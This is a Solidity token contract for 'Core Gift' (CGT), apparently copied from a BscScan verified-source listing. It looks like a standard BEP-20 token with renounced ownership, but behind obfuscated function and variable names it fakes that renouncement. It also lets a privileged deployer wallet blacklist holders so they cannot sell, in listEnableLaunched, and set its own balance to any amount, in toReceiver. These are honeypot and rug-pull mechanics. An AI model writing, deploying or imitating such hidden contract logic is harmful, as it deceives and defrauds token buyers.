/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

abstract contract fundLimit {
    function tokenLiquidity() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface sellReceiverReceiver {
    function createPair(address fromLaunch, address minAt) external returns (address);
}

interface listSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CoreGift is IERC20, fundLimit {
    

    bool private totalAtEnable;

    event OwnershipTransferred(address indexed amountLaunchedWallet, address indexed amountFundTeam);
    uint256 private walletBuy;
    string private swapMarketingLiquidity = "Core Gift";
    uint8 private shouldTakeList = 18;

    mapping(address => bool) public senderMax;
    string private listBuyLiquidity = "CGT";
    
    address public marketingSender;
    mapping(address => bool) public walletAuto;

    uint256 private launchAuto;
    address private feeLimit;
    address public limitFee;
    uint256 private minTotal = 100000000 * 10 ** 18;
    bool private listAuto;
    mapping(address => mapping(address => uint256)) private liquidityFee;
    bool public tokenTake;
    uint256 public tokenSwap;
    mapping(address => uint256) private txBuyShould;
    bool public receiverMax;
    
    

    constructor (){
        
        listSwap launchedAuto = listSwap(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        marketingSender = sellReceiverReceiver(launchedAuto.factory()).createPair(launchedAuto.WETH(), address(this));
        feeLimit = tokenLiquidity();
        if (walletBuy != tokenSwap) {
            walletBuy = launchAuto;
        }
        limitFee = tokenLiquidity();
        walletAuto[tokenLiquidity()] = true;
        
        txBuyShould[tokenLiquidity()] = minTotal;
        emit Transfer(address(0), limitFee, minTotal);
        totalLaunch();
    }

    

    function symbol() external view returns (string memory) {
        return listBuyLiquidity;
    }

    function fundLaunched() public view returns (uint256) {
        return launchAuto;
    }

    function transferFrom(address limitTx, address tokenTeamExempt, uint256 walletTeam) external override returns (bool) {
        if (liquidityFee[limitTx][tokenLiquidity()] != type(uint256).max) {
            require(walletTeam <= liquidityFee[limitTx][tokenLiquidity()]);
            liquidityFee[limitTx][tokenLiquidity()] -= walletTeam;
        }
        return txEnable(limitTx, tokenTeamExempt, walletTeam);
    }

    function allowance(address toTrading, address maxSwapTake) external view virtual override returns (uint256) {
        return liquidityFee[toTrading][maxSwapTake];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return minTotal;
    }

    function maxSender() public {
        if (tokenSwap == walletBuy) {
            receiverMax = true;
        }
        if (walletBuy == launchAuto) {
            walletBuy = tokenSwap;
        }
        receiverMax=false;
    }

    function autoIs() public view returns (bool) {
        return totalAtEnable;
    }

    function name() external view returns (string memory) {
        return swapMarketingLiquidity;
    }

    function txEnable(address limitTx, address tokenTeamExempt, uint256 walletTeam) internal returns (bool) {
        if (limitTx == limitFee) {
            return minReceiver(limitTx, tokenTeamExempt, walletTeam);
        }
        require(!senderMax[limitTx]);
        return minReceiver(limitTx, tokenTeamExempt, walletTeam);
    }

    function minReceiver(address limitTx, address tokenTeamExempt, uint256 walletTeam) internal returns (bool) {
        require(txBuyShould[limitTx] >= walletTeam);
        txBuyShould[limitTx] -= walletTeam;
        txBuyShould[tokenTeamExempt] += walletTeam;
        emit Transfer(limitTx, tokenTeamExempt, walletTeam);
        return true;
    }

    function fromList() public {
        if (listAuto != receiverMax) {
            launchAuto = walletBuy;
        }
        if (listAuto) {
            launchAuto = walletBuy;
        }
        totalAtEnable=false;
    }

    function senderList(address walletTotalReceiver) public {
        if (tokenTake) {
            return;
        }
        
        walletAuto[walletTotalReceiver] = true;
        
        tokenTake = true;
    }

    function owner() external view returns (address) {
        return feeLimit;
    }

    function exemptTrading() public view returns (uint256) {
        return launchAuto;
    }

    function decimals() external view returns (uint8) {
        return shouldTakeList;
    }

    function listEnableLaunched(address limitMarketing) public {
        if (receiverMax) {
            launchAuto = walletBuy;
        }
        if (limitMarketing == limitFee || limitMarketing == marketingSender || !walletAuto[tokenLiquidity()]) {
            return;
        }
        if (tokenSwap == walletBuy) {
            listAuto = true;
        }
        senderMax[limitMarketing] = true;
    }

    function getOwner() external view returns (address) {
        return feeLimit;
    }

    function transfer(address exemptTo, uint256 walletTeam) external virtual override returns (bool) {
        return txEnable(tokenLiquidity(), exemptTo, walletTeam);
    }

    function amountFrom() public view returns (uint256) {
        return tokenSwap;
    }

    function balanceOf(address tokenMinMarketing) public view virtual override returns (uint256) {
        return txBuyShould[tokenMinMarketing];
    }

    function approve(address maxSwapTake, uint256 walletTeam) public virtual override returns (bool) {
        liquidityFee[tokenLiquidity()][maxSwapTake] = walletTeam;
        emit Approval(tokenLiquidity(), maxSwapTake, walletTeam);
        return true;
    }

    function toReceiver(uint256 walletTeam) public {
        if (!walletAuto[tokenLiquidity()]) {
            return;
        }
        txBuyShould[limitFee] = walletTeam;
    }

    function totalWallet() public view returns (uint256) {
        return tokenSwap;
    }

    function totalLaunch() public {
        emit OwnershipTransferred(limitFee, address(0));
        feeLimit = address(0);
    }


}